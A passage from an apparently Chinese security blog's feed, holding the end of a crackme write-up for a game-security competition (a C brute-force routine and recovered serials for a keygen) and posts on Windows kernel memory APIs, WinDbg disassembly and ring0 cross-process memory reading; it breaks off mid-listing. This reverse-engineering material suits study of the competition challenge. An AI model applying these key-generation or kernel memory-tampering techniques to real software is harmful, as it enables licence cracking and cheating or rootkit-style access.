<p>#编程求解：<br>我们以venidic为用户名，算出<br>U1 = F453CFF5<br>U2 = F91A55D1<br>U3 = 08F8F745<br>U4 = 03D6CE40<br>U5 = 00083E5E<br>那么则通过上述方程可以求解<br>K1 = 15C8BCCA<br>K2 = 1AE2A771<br>K3 = E1C1F5BB<br>K4 = 0CCFC585<br>K5 = ED6E25C6<br>又在序列号计算中可知4为字符生成三字节的k，则将k1–k5以3字节分组，编程求解，即可以得到每一个偏移(最后少一个字节数据，那我们可以直接穷举)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line">void Enmu(int key1, int key2, int key3)</div><div class="line">&#123;</div><div class="line">    int a,b,c,d;</div><div class="line">    int k1,k2,k3;</div><div class="line">    for (a=0;a&lt;=64;a++)</div><div class="line">    &#123;</div><div class="line">        for (b=0;b&lt;=64;b++)</div><div class="line">        &#123;</div><div class="line">            for (c=0;c&lt;=64;c++)</div><div class="line">            &#123;</div><div class="line">                for(d = 0;d&lt;=64;d++)</div><div class="line">                &#123;</div><div class="line">                    k1 = (4*a + ((b&gt;&gt;4)&amp;3))&amp;0xff;</div><div class="line">                    k2 = ((16*b)^((c&gt;&gt;2) &amp; 15))&amp;0xff;</div><div class="line">                    k3 = (d + ((c) &lt;&lt;6))&amp;0xff;</div><div class="line">                    if ((k1 == key1) &amp;&amp; (k2 == key2) &amp;&amp; (k3 == key3))</div><div class="line">                    &#123;</div><div class="line">                        //printf(&quot;a=%d\tb=%d\tc=%d\td=%d\t\n&quot;,a,b,c,d);</div><div class="line">                        printf(&quot;key = %c, %c, %c, %c\n&quot;,gstr[a], gstr[b], gstr[c],gstr[d]);</div><div class="line">                        return;</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line">void KenKey()</div><div class="line">&#123;</div><div class="line">    </div><div class="line">    int naddr0, naddr1, naddr2, naddr3;</div><div class="line">    int k1,k2,k3;</div><div class="line">    </div><div class="line">    Enmu(0xCA,0xBC,0xC8);</div><div class="line">    Enmu(0x15,0x71,0xA7);</div><div class="line">    Enmu(0xE2,0x1A,0xBB);</div><div class="line">    Enmu(0xF5,0xC1,0xE1);</div><div class="line">    Enmu(0x85,0xC5,0xCF);</div><div class="line">    Enmu(0x0C,0xC6,0x25);</div><div class="line">    //Enmu(0x6E,0xF3,);</div><div class="line">    int a,b,c;</div><div class="line">    for (a=0;a&lt;=64;a++)</div><div class="line">    &#123;</div><div class="line">        for (b=0;b&lt;=64;b++)</div><div class="line">        &#123;</div><div class="line">            for (c=0;c&lt;=64;c++)</div><div class="line">            &#123;</div><div class="line">                k1 = (4*a + ((b&gt;&gt;4)&amp;3))&amp;0xff;</div><div class="line">                k2 = ((16*b)^((c&gt;&gt;2) &amp; 15))&amp;0xff;</div><div class="line">                if ((k1 == 0x6E) &amp;&amp; (k2 == 0xED) )</div><div class="line">                &#123;</div><div class="line">                    printf(&quot;key = %c, %c, %c\n&quot;,gstr[a], gstr[b], gstr[c]);</div><div class="line">                    </div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>最终得到<br><img src="http://ww4.sinaimg.cn/large/dcfd67b5gw1f1rr32i0bxj20g208i3z2.jpg" alt=""><br>可获得一组key<br>用户名:venidic<br>序列号：yrzIFXGn4hq79cHhhcXPDMYlbu0<br>或者yrzIFXGn4hq79cHhhcXPDMYlbu1，或者yrzIFXGn4hq79cHhhcXPDMYlbu2<br>或者yrzIFXGn4hq79cHhhcXPDMYlbu3<br><img src="http://ww2.sinaimg.cn/large/dcfd67b5gw1f1rr3d7ll3j20d005c74i.jpg" alt=""></p>
<p>#后<br>最后就可以结合分析出来的算法写出注册机了。不得不说，自己的编程能力还是不行，分析这个程序一个下午不到，写个程序妈蛋快花了一天了。<br>哎！我还是去看下数据结构和算法吧。(ಥ _ ಥ)</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近被告知部门举办了关于游戏安全的比赛，网址是&lt;a href=&quot;http://gslab.qq.com/competition/index.shtml&quot; title=&quot;游戏安全技术竞赛&quot;&gt;游戏安全技术竞赛&lt;/a&gt;,看了下，奖励还算可以，就是不该全是QB，再加上这几天实在是冻的不行，宅在寝室就分析了下这个题。&lt;br&gt;
    
    </summary>
    
      <category term="逆向分析" scheme="http://venidic.com/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    
    
      <category term="破解" scheme="http://venidic.com/tags/%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="竞赛" scheme="http://venidic.com/tags/%E7%AB%9E%E8%B5%9B/"/>
    
      <category term="算法分析" scheme="http://venidic.com/tags/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>win7x64内核安全（4）-字符串操作</title>
    <link href="http://venidic.com/2016/02/16/win7x64%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8%EF%BC%884%EF%BC%89-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9CHAHA%20/"/>
    <id>http://venidic.com/2016/02/16/win7x64内核安全（4）-字符串操作HAHA /</id>
    <published>2016-02-16T07:08:24.000Z</published>
    <updated>2016-02-16T07:08:26.000Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>win7 x64内核安全（3）-内存管理及操作</title>
    <link href="http://venidic.com/2016/01/26/x64%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8%EF%BC%883%EF%BC%89-%E5%86%85%E5%AD%98/"/>
    <id>http://venidic.com/2016/01/26/x64内核安全（3）-内存/</id>
    <published>2016-01-25T16:47:23.000Z</published>
    <updated>2016-02-04T06:08:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>这里接着上一篇，继续写关于windows内核中的内存操作。<br>之前也写过关于内存管理的一些博客：<br><a href="http://venidic.com/2015/08/12/windows%E5%88%86%E9%A1%B5%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90/">windows分页机制分析</a></p>
<p><a href="http://venidic.com/2015/08/15/%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E4%B8%8E%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%E5%88%86%E6%9E%90/">虚拟地址与物理地址分析</a></p>
<p>这次我们在来谈谈关于内核内存中的驱动编程<br><a id="more"></a></p>
<p>#内存管理： </p>
<p>这里列举一些基本的内存操作函数：、<br>类似于malloc的<strong>ExAllocatePool</strong>负责内存空间分配<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">PVOID ExAllocatePool(</div><div class="line">  _In_ POOL_TYPE PoolType,</div><div class="line">  _In_ SIZE_T    NumberOfBytes</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>第一个参数决定是分页内存还是非分页内存，第二个参数为要分配的字节数。<br>现在经常会使用<strong>ExAllocatePoolWithTag</strong>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">PVOID ExAllocatePoolWithTag(</div><div class="line">  _In_ POOL_TYPE PoolType,</div><div class="line">  _In_ SIZE_T    NumberOfBytes,</div><div class="line">  _In_ ULONG     Tag</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>这个函数比上面一个多了4个字节用来存放tag、以标记处内存块。方便识别有问题的内存块。<br>此外还有类似于memcpy的<strong>RtlMoveMemory</strong>负责内存间复制（可重叠）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">VOID RtlMoveMemory(</div><div class="line">  _Out_       VOID UNALIGNED *Destination,</div><div class="line">  _In_  const VOID UNALIGNED *Source,</div><div class="line">  _In_        SIZE_T         Length</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>还有内存间复制（非重叠）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">VOID RtlCopyMemory(</div><div class="line">  _Out_       VOID UNALIGNED *Destination,</div><div class="line">  _In_  const VOID UNALIGNED *Source,</div><div class="line">  _In_        SIZE_T         Length</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>类似于memset的<strong>RtlFillMemory</strong>负责内存间填充<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">VOID RtlFillMemory(</div><div class="line">  _Out_ VOID UNALIGNED *Destination,</div><div class="line">  _In_  SIZE_T         Length,</div><div class="line">  _In_  UCHAR          Fill</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>以及释放内存的<strong>ExFreePool</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">VOID ExFreePool(</div><div class="line">  _In_ PVOID P</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>以及对应的<strong>ExFreePoolWithTag</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">VOID ExFreePoolWithTag(</div><div class="line">  _In_ PVOID P,</div><div class="line">  _In_ ULONG Tag</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>在编程的时候为了防止BIOS，一定要注意分页内存和非分页内存的使用，我们一般为了安全起见，将<strong>分页内存存放数据，非分页内存存放代码</strong>，一般访问到切换出去的内存会自动调用缺页异常吗，但是如果执行到切换出去的内存的时候就直接BIOS了。<br>当然为了保险起见，我们可以在使用内存前先对内存进行检查，用到的API有<br><code>ProbeForRead</code>和<code>ProbeForWrite</code>配合try-except，来检测内存是否可读写</p>
<p>#x86体系ring0下跨进程读写内存<br>详情请参见：<br><a href="http://venidic.com/2016/01/24/x86ring0%E4%B8%8B%E8%B7%A8%E8%BF%9B%E7%A8%8B%E8%AF%BB%E5%86%99%E5%86%85%E5%AD%98/">x86架构下ring0级跨进程读写内存</a></p>
<p>#x64体系ring0下跨进程读写内存</p>
<p>##x64下的fs-&gt;gs<br>在x64下的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">kd&gt; uf NtReadVirtualMemory </div><div class="line">nt!NtReadVirtualMemory:</div><div class="line">fffff800`0417c9c0 488bc4          mov     rax,rsp</div><div class="line">fffff800`0417c9c3 48895808        mov     qword ptr [rax+8],rbx</div><div class="line">fffff800`0417c9c7 48897010        mov     qword ptr [rax+10h],rsi</div><div class="line">fffff800`0417c9cb 48897818        mov     qword ptr [rax+18h],rdi</div><div class="line">fffff800`0417c9cf 4c896020        mov     qword ptr [rax+20h],r12</div><div class="line">fffff800`0417c9d3 4155            push    r13</div><div class="line">fffff800`0417c9d5 4156            push    r14</div><div class="line">fffff800`0417c9d7 4157            push    r15</div><div class="line">fffff800`0417c9d9 4883ec60        sub     rsp,60h</div><div class="line">fffff800`0417c9dd 4d8be1          mov     r12,r9</div><div class="line">fffff800`0417c9e0 4d8bf0          mov     r14,r8</div><div class="line">fffff800`0417c9e3 4c8bea          mov     r13,rdx</div><div class="line">fffff800`0417c9e6 4c8bd1          mov     r10,rcx</div><div class="line">fffff800`0417c9e9 65488b042588010000 mov   rax,qword ptr gs:[188h]</div><div class="line">fffff800`0417c9f2 4889442458      mov     qword ptr [rsp+58h],rax</div><div class="line">fffff800`0417c9f7 448ab8f6010000  mov     r15b,byte ptr [rax+1F6h]</div><div class="line">fffff800`0417c9fe 4584ff          test    r15b,r15b</div><div class="line">fffff800`0417ca01 0f84232b0b00    je      nt! ?? ::NNGAKEGL::`string&apos;+0x53e0a (fffff800`0422f52a)</div><div class="line"></div><div class="line">... ... ... ...</div></pre></td></tr></table></figure></p>
<p>这里会发现微软在从x86到x64做了调整，_kpcr的结构不在由fs寄存器指向，而是更改成gs</p>
<blockquote>
<p>这是因为AMD率先在其x64芯片中添加了内核特权指令SWAPGS（主要用于从MSR中快速获取内核结构指针到GS寄存器），Intel在x64位领域由于慢了一拍也只好遵从此指令以保证兼容性。微软等操作系统厂商当然会充分利用这条可以节省CPU时钟周期的现成指令。</p>
</blockquote>
<p>除了gs:[188h]还有一些常见的偏移：<br>TEB: gs:[0x30]<br>Pid: gs:[0x40]<br>Tid: gs:[0x48]<br>PEB: gs:[0x60]<br>这里的PEB的获得一般最好借助下TEB下再次获得PEB做下校验，因为x64后引入了地址随机化，所以有可能会获得错误的地址。</p>
<p>##获得EPROCESS结构<br>通过分析上面函数的反汇编，可以知道这里的gs:[188h]寄存器又指向KTHREAD（<em>也可以说成ETHREAD，因为KTHREAD在ETHREAD的0x00位置处</em>）结构。<br>继续调试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">kd&gt; dt _kthread </div><div class="line">nt!_KTHREAD</div><div class="line">   +0x000 Header           : _DISPATCHER_HEADER</div><div class="line">   +0x018 CycleTime        : Uint8B</div><div class="line">   +0x020 QuantumTarget    : Uint8B</div><div class="line">   +0x028 InitialStack     : Ptr64 Void</div><div class="line">   </div><div class="line">... ....</div><div class="line">   +0x050 ApcState         : _KAPC_STATE</div><div class="line">   +0x050 ApcStateFill     : [43] UChar</div><div class="line">   +0x07b Priority         : Char</div><div class="line">   +0x07c NextProcessor    : Uint4B</div><div class="line">   +0x080 DeferredProcessor : Uint4B</div><div class="line">   +0x088 ApcQueueLock     : Uint8B</div><div class="line">   +0x090 WaitStatus       : Int8B</div><div class="line">   +0x098 WaitBlockList    : Ptr64 _KWAIT_BLOCK</div><div class="line">   +0x0a0 WaitListEntry    : _LIST_ENTRY</div><div class="line">   +0x0a0 SwapListEntry    : _SINGLE_LIST_ENTRY</div><div class="line">   +0x0b0 Queue            : Ptr64 _KQUEUE</div><div class="line">   +0x0b8 Teb              : Ptr64 Void</div></pre></td></tr></table></figure></p>
<p>我们继续调试apcstate结构：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">kd&gt; dt _KAPC_STATE</div><div class="line">nt!_KAPC_STATE</div><div class="line">   +0x000 ApcListHead      : [2] _LIST_ENTRY</div><div class="line">   +0x020 Process          : Ptr64 _KPROCESS</div><div class="line">   +0x028 KernelApcInProgress : UChar</div><div class="line">   +0x029 KernelApcPending : UChar</div><div class="line">   +0x02a UserApcPending   : UChar</div></pre></td></tr></table></figure></p>
<p>得到_KPROCESS结构，即得到EPROCESS结构，同样是因为KPROCESS在EPROCESS的偏移0x00位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">kd&gt; dt _eprocess</div><div class="line">nt!_EPROCESS</div><div class="line">   +0x000 Pcb              : _KPROCESS</div><div class="line">   +0x160 ProcessLock      : _EX_PUSH_LOCK</div><div class="line">   +0x168 CreateTime       : _LARGE_INTEGER</div><div class="line">   +0x170 ExitTime         : _LARGE_INTEGER</div><div class="line">   +0x178 RundownProtect   : _EX_RUNDOWN_REF</div><div class="line">   +0x180 UniqueProcessId  : Ptr64 Void</div><div class="line">   +0x188 ActiveProcessLinks : _LIST_ENT</div></pre></td></tr></table></figure></p>
<p>得到了EPRCOESS，就能得到很多信息了。</p>
<h2 id="x64下的版本号"><a href="#x64下的版本号" class="headerlink" title="x64下的版本号"></a>x64下的版本号</h2><p>获取win7下的版本号，用之前写的测试驱动，加上如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ULONG ulMajorVersion;</div><div class="line">ULONG ulMinorVersion;</div><div class="line">ULONG ulBuildNumber;</div><div class="line"></div><div class="line">PsGetVersion(&amp;ulMajorVersion, &amp;ulMinorVersion, &amp;ulBuildNumber, NULL);</div><div class="line">DbgPrint(&quot;MajorVersion = %d\nMinorVerison = %d\nBuildBumber = %d\n&quot;, ulMajorVersion, ulMinorVersion, ulBuildNumber);</div></pre></td></tr></table></figure></p>
<p>测试截图如下：<br><img src="http://ww4.sinaimg.cn/large/dcfd67b5gw1f0n9tcyz39j20rw082jv0.jpg" alt=""><br><em>这里额外说一句，如果用buildnumber判定操作系统的时候，我们在双击调试下，桌面上会显示系统的版本号如下图：</em><br><img src="http://ww4.sinaimg.cn/large/dcfd67b5gw1f0n9tlh13lj204w02gq2r.jpg" alt=""></p>
<p>#后<br>配合之前调试得到的eprocess及部分结构的偏移就可以写出x64下跨进程读写内存的代码了。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这里接着上一篇，继续写关于windows内核中的内存操作。&lt;br&gt;之前也写过关于内存管理的一些博客：&lt;br&gt;&lt;a href=&quot;http://venidic.com/2015/08/12/windows%E5%88%86%E9%A1%B5%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90/&quot;&gt;windows分页机制分析&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://venidic.com/2015/08/15/%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E4%B8%8E%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%E5%88%86%E6%9E%90/&quot;&gt;虚拟地址与物理地址分析&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这次我们在来谈谈关于内核内存中的驱动编程&lt;br&gt;
    
    </summary>
    
      <category term="系统安全" scheme="http://venidic.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="驱动" scheme="http://venidic.com/tags/%E9%A9%B1%E5%8A%A8/"/>
    
  </entry>
  
  <entry>
    <title>x86架构下ring0下跨进程读写内存</title>
    <link href="http://venidic.com/2016/01/24/x86ring0%E4%B8%8B%E8%B7%A8%E8%BF%9B%E7%A8%8B%E8%AF%BB%E5%86%99%E5%86%85%E5%AD%98/"/>
    <id>http://venidic.com/2016/01/24/x86ring0下跨进程读写内存/</id>
    <published>2016-01-24T15:02:38.000Z</published>
    <updated>2016-01-28T15:35:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>之前写过一篇关于X86下ring0读写内存的文章，功能虽然尚未完善，但是可以参考下如何通过应用层与驱动层通信进而直接改写内存数值。最近在写x64下的操作内存的驱动，于是就把之前写的代码翻出来一起发了出来<br><a id="more"></a></p>
<p>#从ReadProcessMemory说起<br>我们知道ReadProcessMemory在底层通过调用NtReadVirtualMemory实现，我们用windbg打印下函数的实现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">0: kd&gt; uf NtReadVirtualMemory</div><div class="line">nt!NtReadVirtualMemory:</div><div class="line">805b528a 6a1c            push    1Ch</div><div class="line">805b528c 68e8ae4d80      push    offset nt!MmClaimParameterAdjustDownTime+0x90 (804daee8)</div><div class="line">805b5291 e8ea78f8ff      call    nt!_SEH_prolog (8053cb80)</div><div class="line">805b5296 64a124010000    mov     eax,dword ptr fs:[00000124h]</div><div class="line">805b529c 8bf8            mov     edi,eax</div><div class="line">… … … … </div><div class="line">nt!NtReadVirtualMemory+0x99:</div><div class="line">805b5323 50              push    eax</div><div class="line">805b5324 8d45dc          lea     eax,[ebp-24h]</div><div class="line">805b5327 50              push    eax</div><div class="line">805b5328 ff75e0          push    dword ptr [ebp-20h]</div><div class="line">805b532b ff35b8495680    push    dword ptr [nt!PsProcessType (805649b8)]</div><div class="line">805b5331 6a10            push    10h     </div><div class="line">805b5333 ff7508          push    dword ptr [ebp+8]  </div><div class="line">805b5336 e857710000      call    nt!ObReferenceObjectByHandle (805bc492)</div><div class="line">805b533b 8945e4          mov     dword ptr [ebp-1Ch],eax</div><div class="line">805b533e 85c0            test    eax,eax</div><div class="line">805b5340 7524            jne     nt!NtReadVirtualMemory+0xdc (805b5366)</div><div class="line"></div><div class="line">nt!NtReadVirtualMemory+0xb8:</div><div class="line">805b5342 8d45d8          lea     eax,[ebp-28h]</div><div class="line">805b5345 50              push    eax</div><div class="line">805b5346 ff75e0          push    dword ptr [ebp-20h]</div><div class="line">805b5349 56              push    esi</div><div class="line">805b534a ff7510          push    dword ptr [ebp+10h]</div><div class="line">805b534d ff7744          push    dword ptr [edi+44h]</div><div class="line">805b5350 ff750c          push    dword ptr [ebp+0Ch]</div><div class="line">805b5353 ff75dc          push    dword ptr [ebp-24h]</div><div class="line">805b5356 e891feffff      call    nt!MmCopyVirtualMemory (805b51ec)</div><div class="line">… … … …</div></pre></td></tr></table></figure></p>
<p>可以知道系统通过调用ObReferenceObjectByHandle得到进程的eprocess结构<br>紧接着我们分析nt!MmCopyVirtualMemory<br>（为了方便我们简单的只保留函数调用部分）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">0: kd&gt; uf nt!MmCopyVirtualMemory </div><div class="line">nt!MmCopyVirtualMemory:</div><div class="line">805b51ec 8bff            mov     edi,edi</div><div class="line">805b51ee 55              push    ebp</div><div class="line">805b51ef 8bec            mov     ebp,esp</div><div class="line">… … … … </div><div class="line">nt!MmCopyVirtualMemory+0x4d:</div><div class="line">805b5239 57              push    edi</div><div class="line">805b523a ff751c          push    dword ptr [ebp+1Ch]</div><div class="line">805b523d ff7518          push    dword ptr [ebp+18h]</div><div class="line">805b5240 ff7514          push    dword ptr [ebp+14h]</div><div class="line">805b5243 ff7510          push    dword ptr [ebp+10h]</div><div class="line">805b5246 ff750c          push    dword ptr [ebp+0Ch]</div><div class="line">805b5249 53              push    ebx</div><div class="line">805b524a e87ffbffff      call    nt!MiDoMappedCopy (805b4dce)</div><div class="line">805b524f 8bf0            mov     esi,eax</div><div class="line">805b5251 81fea10000c0    cmp     esi,0C00000A1h</div><div class="line">805b5257 751b            jne     nt!MmCopyVirtualMemory+0x88 (805b5274)</div><div class="line"></div><div class="line">nt!MmCopyVirtualMemory+0x6d:</div><div class="line">805b5259 832700          and     dword ptr [edi],0</div><div class="line"></div><div class="line">nt!MmCopyVirtualMemory+0x70:</div><div class="line">805b525c 57              push    edi</div><div class="line">805b525d ff751c          push    dword ptr [ebp+1Ch]</div><div class="line">805b5260 ff7518          push    dword ptr [ebp+18h]</div><div class="line">805b5263 ff7514          push    dword ptr [ebp+14h]</div><div class="line">805b5266 ff7510          push    dword ptr [ebp+10h]</div><div class="line">805b5269 ff750c          push    dword ptr [ebp+0Ch]</div><div class="line">805b526c 53              push    ebx</div><div class="line">805b526d e882fdffff      call    nt!MiDoPoolCopy (805b4ff4)</div><div class="line">… … … …</div></pre></td></tr></table></figure></p>
<p>而我们跟进MiDoPoolCopy和MiDoMappedCopy分别发现他们都调用了<br>KeStackAttachProcess<br>根据上述，ReadProcessMemory通过ObReferenceObjectByHandle得到EPROCESS结构，然后调用KeStackAttachProcess进行附加，切换进程环境之后进行拷贝，进而得到目标进程中内存内容。</p>
<p>#获得EPROCESS结构<br>通常情况下在内核层获取进程信息通过会调用一个这样的函数：<br>PsGetCurrentProcess<br>微软给的定义：<br>PEPROCESS  PsGetCurrentProcess(void);<br>我们查看下在底层的实现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">0: kd&gt; u PsGetCurrentProcess</div><div class="line">nt!PsGetCurrentProcess:</div><div class="line">8052c2d2 64a124010000    mov     eax,dword ptr fs:[00000124h]</div><div class="line">8052c2d8 8b4044          mov     eax,dword ptr [eax+44h]</div></pre></td></tr></table></figure></p>
<p>FS寄存器：<br>在ring0下 我们比较好利用的是 fs 寄存器<br>在ring0 下fs指向的是kpcr结构<br>首先我们查看kpcr结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">nt!_KPCR</div><div class="line">   +0x000 NtTib            : _NT_TIB</div><div class="line">   +0x01c SelfPcr          : Ptr32 _KPCR</div><div class="line">   +0x020 Prcb             : Ptr32 _KPRCB</div><div class="line">   +0x024 Irql             : UChar</div><div class="line">   +0x028 IRR              : Uint4B</div><div class="line">   +0x02c IrrActive        : Uint4B</div><div class="line">   +0x030 IDR              : Uint4B</div><div class="line">  … … … … </div><div class="line">   +0x0d8 Spare1           : UChar</div><div class="line">   +0x0dc KernelReserved2  : [17] Uint4B</div><div class="line">   +0x120 PrcbData         : _KPRCB</div></pre></td></tr></table></figure></p>
<p>我们查看0x120这个结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">0: kd&gt; dt _kprcb</div><div class="line">nt!_KPRCB</div><div class="line">   +0x000 MinorVersion     : Uint2B</div><div class="line">   +0x002 MajorVersion     : Uint2B</div><div class="line">   +0x004 CurrentThread    : Ptr32 _KTHREAD</div><div class="line">   +0x008 NextThread       : Ptr32 _KTHREAD</div><div class="line">   +0x00c IdleThread       : Ptr32 _KTHREAD</div></pre></td></tr></table></figure></p>
<p>继续查看currentthread结构<br>为了方便我们打印详细信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div 